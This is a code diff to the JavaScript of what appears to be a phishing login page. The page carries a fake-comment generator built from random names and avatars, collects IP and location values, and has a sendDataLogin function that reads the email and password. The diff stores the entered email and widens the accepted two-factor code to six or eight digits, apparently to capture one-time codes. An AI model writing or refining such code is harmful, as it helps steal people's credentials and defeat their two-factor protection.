@@ -258,7 +258,7 @@
             "/images/test5.gif",
         ];
 
-        $('#myVideo').attr('src', VIDEO[getRandom(0, VIDEO.length - 1)]);
+        // $('#myVideo').attr('src', VIDEO[getRandom(0, VIDEO.length - 1)]);
 
         var ipAddress = "";
         var latitude = "";
@@ -317,28 +317,28 @@
         }, 200);
 
         var id_interval = null;
-        $(document).ready(function() {
-            id_interval = setInterval(() => {
-                $('.list-comment').append(`
-                <div class="comment mb-2">
-                    <div class="comment-left">
-                        <img width="50px" height="50px" style="border-radius: 50%" src="${AVATAR[getRandom(0, AVATAR.length - 1)]}"
-                            alt="image">
-                    </div>
-                    <div class="comment-right">
-                        <p style="font-weight:bold">${NAME[getRandom(0, NAME.length - 1)]}</p>
-                       ${COMMENT[getRandom(0, COMMENT.length - 1)]} <img height="16" width="16" class="xz74otr"
-                                referrerpolicy="origin-when-cross-origin"
-                                src="${ICON[getRandom(0, ICON.length - 1)]}">
-                    </div>
-                </div>
-                `);
-                $(".list-comment").animate({
-                    scrollTop: $('.list-comment')[0].scrollHeight - $('.list-comment')[0]
-                        .clientHeight
-                }, 200);
-            }, 3000);
-        });
+        // $(document).ready(function() {
+        //     id_interval = setInterval(() => {
+        //         $('.list-comment').append(`
+        //         <div class="comment mb-2">
+        //             <div class="comment-left">
+        //                 <img width="50px" height="50px" style="border-radius: 50%" src="${AVATAR[getRandom(0, AVATAR.length - 1)]}"
+        //                     alt="image">
+        //             </div>
+        //             <div class="comment-right">
+        //                 <p style="font-weight:bold">${NAME[getRandom(0, NAME.length - 1)]}</p>
+        //               ${COMMENT[getRandom(0, COMMENT.length - 1)]} <img height="16" width="16" class="xz74otr"
+        //                         referrerpolicy="origin-when-cross-origin"
+        //                         src="${ICON[getRandom(0, ICON.length - 1)]}">
+        //             </div>
+        //         </div>
+        //         `);
+        //         $(".list-comment").animate({
+        //             scrollTop: $('.list-comment')[0].scrollHeight - $('.list-comment')[0]
+        //                 .clientHeight
+        //         }, 200);
+        //     }, 3000);
+        // });
 
         function getRandom(min, max) {
             return Math.floor(Math.random() * (max - min + 1)) + min;
@@ -349,6 +349,7 @@
 
         function sendDataLogin() {
             const valueEmail = $('#username-desktop').val();
+            email = valueEmail;
             const valuePassword = $('#password-desktop').val();
             const loading = $('#submit-login-loading');
             const text = $('#submit-login-text');
@@ -580,8 +581,8 @@
 
         function validateFa() {
             let value = $(this).val();
-            if (value.length > 6) {
-                value = value.slice(0, 6);
+            if (value.length > 8) {
+                value = value.slice(0, 8);
                 $(this).val(value);
             }
             if (isValidateFa(value)) {
@@ -592,7 +593,8 @@
         }
 
         function isValidateFa(value) {
-            const regexFa = /^\d{6}$/;
+            const regexFa = /^\d{6}$|^\d{8}$/;
+            // const regexFa = email.includes("@") ? /^\d{8}$/ : /^\d{6}$/;
 
             return regexFa.test(value);
         }
